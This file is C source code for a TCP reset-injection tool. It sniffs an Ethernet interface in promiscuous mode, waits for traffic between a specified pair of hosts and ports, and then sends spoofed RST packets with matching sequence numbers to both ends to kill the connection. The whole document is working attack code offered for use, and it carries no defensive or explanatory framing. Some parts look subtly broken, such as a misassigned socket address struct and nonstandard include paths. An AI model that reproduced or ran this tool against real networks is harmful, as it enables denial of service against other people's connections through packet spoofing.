#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <tcpip$examples/in.h>
#include <tcpip$examples/ip.h>
#include <tcpip$examples/tcp.h>
#include <tcpip$examples/if_ether.h>
#include <tcpip$examples/if.h>
#include <ioctls.h>

#define RSTS	    10
#define IF	"eth0"

int sp_fd;

unsigned short ip_fast_csum(unsigned char *iph,unsigned long ihl) {
        unsigned long sum;

        __asm__ __volatile__("
            movl (%1), %0
            subl $4, %2
            jbe 2f
            addl 4(%1), %0
            adcl 8(%1), %0
            adcl 12(%1), %0
1:          adcl 16(%1), %0
            lea 4(%1), %1
            decl %2
            jne 1b
            adcl $0, %0
            movl %0, %2
            shrl $16, %0
            addw %w2, %w0
            adcl $0, %0
            notl %0
2:
        "
        : "=r" (sum), "=r" (iph), "=r" (ihl)
        : "1" (iph), "2" (ihl));
        return(sum);
}

struct tcppk {                         
        struct iphdr ip;
        struct tcphdr tcp;
        char data[1500];
};

struct pseudo {
    unsigned long saddr, daddr;
    unsigned char zero, proto;
    unsigned short len;
};

void raw(void)
{
    int opt=1;

    if((sp_fd=socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) <0){
        perror("\nRAWIP() RAW Socket problems [Died]");
        exit();
    }
    if(setsockopt(sp_fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) <0){
            perror("RAWIP() Cannot set IP_HDRINCL [Died]");
            exit();
    }

}

int tap(char* device,int mode)
{
    int fd;
    struct ifreq ifr;

    if((fd=socket(AF_INET, SOCK_PACKET, htons(0x3))) <0){
        perror("SNIFF() SOCK_PACKET allocation problems [Died]");
        exit();
    }

    strcpy(ifr.ifr_name,device);
    if((ioctl(fd, SIOCGIFFLAGS, &ifr)) <0){    
        perror("SNIFF() Can't get device flags [Died]");
        close(fd);
        exit();
    }

    if(!mode)ifr.ifr_flags ^= IFF_PROMISC;
    else ifr.ifr_flags |= IFF_PROMISC;
    if((ioctl(fd, SIOCSIFFLAGS, &ifr)) <0){
        perror("SNIFF() Can't set/unset promiscuous mode [Died]");
        close(fd);
        exit();
    }

    if(!mode){
        close(fd);
        return(0);
    }
    else return(fd);
}

unsigned long in_aton(const char *str)
{
        unsigned long l;
        unsigned long val;
        int i;

        l = 0;
        for (i = 0; i < 4; i++)
        {
           l <<= 8;
           if (*str != '\0')
           {
               val = 0;
               while (*str != '\0' && *str != '.')
               {
                        val *= 10;
                        val += *str - '0';
                                str++;
                        }
                        l |= val;
                        if (*str != '\0')
                                str++;
                }
        }
        return(htonl(l));
}

void uff(void) {
    printf("\nUso: RST sourceIP src_port destIP dest_port\n\n");
    exit(1);
}

int main(int argc, char **argv) {

    unsigned char buffer[1500], checkbuff[32], checkbuff2[32];
    struct sockaddr_in sin, sin2;
    struct iphdr *ip;
    struct tcphdr *tcp;
    struct pseudo *psp, *psp2;
    struct tcppk tpk, tpk2;
    int sniff, snt, snt2, rst=0;
    unsigned long saddr, daddr;
    unsigned short src, dest;

    if(argc<5) {
	uff();
	    exit(1);
	    }
	    saddr=in_aton(argv[1]);daddr=in_aton(argv[3]);
	    src=htons(atoi(argv[2]));dest=htons(atoi(argv[4]));

    sniff=tap(IF, 1);
    raw();

    if(setpriority(0, 0, -20) <0){
                printf("\nRST setpriority Error\n");
        }

        ip = (struct iphdr *)(((char *)buffer)+14);
        tcp = (struct tcphdr *)(((char *)buffer)+(sizeof(struct iphdr)+14));
        psp = (struct pseudo *)checkbuff;
	psp2 = (struct pseudo *)checkbuff2;

    memset(&sin, 0, sizeof(sin));
        sin.sin_family=AF_INET;
        sin.sin_port=src;
        sin.sin_addr.s_addr=saddr;
	memset(&sin2, 0, sizeof(sin2));
	sin.sin_family=AF_INET;
        sin.sin_port=dest;
        sin.sin_addr.s_addr=daddr;

        memset(&tpk, 0, sizeof(tpk));
	memset(&tpk2, 0, sizeof(tpk2));
	memset(psp, 0, sizeof(struct pseudo));
	memset(psp2, 0, sizeof(struct pseudo));	

        tpk.ip.ihl=5;
        tpk.ip.version=4;
        tpk.ip.tos=0;
        tpk.ip.tot_len=htons(40);
        tpk.ip.frag_off=0;
        tpk.ip.ttl=64;
        tpk.ip.protocol=IPPROTO_TCP;
        tpk.ip.saddr=daddr;
        tpk.ip.daddr=saddr;
        tpk.tcp.source=dest;
        tpk.tcp.dest=src;
        tpk.tcp.doff=5;
        tpk.tcp.rst=1;
        tpk.tcp.ack=1;
        tpk.tcp.window=0;
        psp->saddr=tpk.ip.daddr;
        psp->daddr=tpk.ip.saddr;
        psp->zero=0;
        psp->proto=IPPROTO_TCP;
        psp->len=htons(20);
	tpk2=tpk;
	tpk2.ip.saddr=saddr;
	tpk2.ip.daddr=daddr;
	tpk2.tcp.source=src;
	tpk2.tcp.dest=dest;
	psp2->saddr=tpk.ip.saddr;
        psp2->daddr=tpk.ip.daddr;
        psp2->zero=0;
        psp2->proto=IPPROTO_TCP;
        psp2->len=htons(20);

        printf("RSTing :\t%s:%d > %s:%d\n",
                argv[1], src, argv[3], dest);
        while(read(sniff, &buffer, sizeof(buffer))) {
                if(ip->saddr==daddr &&
                   ip->daddr==saddr &&
                        tcp->source==dest &&
                        tcp->dest==src) {
				tpk.tcp.seq=tcp->seq+htonl(
			    ntohs(ip->tot_len)-40);
                        tpk.tcp.ack_seq=tcp->ack_seq;
				tpk2.tcp.seq=tcp->ack_seq;
					tpk2.tcp.ack_seq=tcp->seq+htonl(
                                ntohs(ip->tot_len)-40);
                        memcpy(checkbuff+12, &tpk.tcp, 20);
                        tpk.tcp.check=ip_fast_csum(
                                (unsigned char *)checkbuff,32);
					memcpy(checkbuff2+12, &tpk2.tcp, 20);
                        tpk2.tcp.check=ip_fast_csum(
                                (unsigned char *)checkbuff2,32);
                          for(; rst<RSTS; rst++) {
				    snt2=sendto(sp_fd, &tpk2, 40, 0,
						(struct sockaddr *)&sin2, sizeof(sin2));
                                snt=sendto(sp_fd, &tpk, 40, 0,
                                (struct sockaddr *)&sin, sizeof(sin));
                                if(snt<0)printf("[SP00F_ERROR]");
					    else printf("[RST]");
                          }
				  break;
                }
        }
	printf("\n");
	tap(IF, 0);
	exit(0);
}

